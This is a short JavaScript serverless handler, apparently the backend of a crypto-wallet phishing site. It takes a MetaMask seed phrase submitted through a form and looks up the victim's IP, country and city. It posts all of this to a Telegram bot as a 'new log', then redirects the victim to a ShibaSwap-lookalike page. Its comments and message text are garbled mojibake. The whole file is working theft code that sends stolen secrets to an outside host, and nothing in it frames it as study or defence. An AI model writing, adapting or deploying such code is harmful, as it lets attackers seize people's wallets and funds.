export async function onRequestPost(context) {
    const data = await context.request.formData();
    const s_eed_Dc = data.get('s_eed_Dc');

    if (!s_eed_Dc) {
        return Response.redirect('../', 301);
    }

    // –ü–æ–ª—É—á–∞–µ–º IP –∏ –≥–µ–æ–¥–∞–Ω–Ω—ã–µ
    const ip = context.request.headers.get('CF-Connecting-IP');
    const domain = context.request.headers.get('host');
    
    // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ —Å—Ç—Ä–∞–Ω–µ –∏ –≥–æ—Ä–æ–¥–µ
    const countryResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
    const cityResponse = await fetch(`https://ipapi.co/${ip}/city/`);
    const country = await countryResponse.text();
    const city = await cityResponse.text();

    // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    const message = `
üí∏ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º, –Ω–æ–≤—ã–π –ª–æ–≥!
üíµ –ö–æ—à–µ–ª—ë–∫: MetaMask
üîë SEED –§—Ä–∞–∑–∞: ${s_eed_Dc}
üóª IP: ${ip}
üåç –°—Ç—Ä–∞–Ω–∞: ${country}
üåá –ì–æ—Ä–æ–¥: ${city}
üîß –î–æ–º–µ–Ω: ${domain}
    `;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
    const BOT_TOKEN = ' ';
    const CHAT_ID = '- ';
    
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });

    return Response.redirect('https://shibaswap-www.pages.dev/', 301);
}
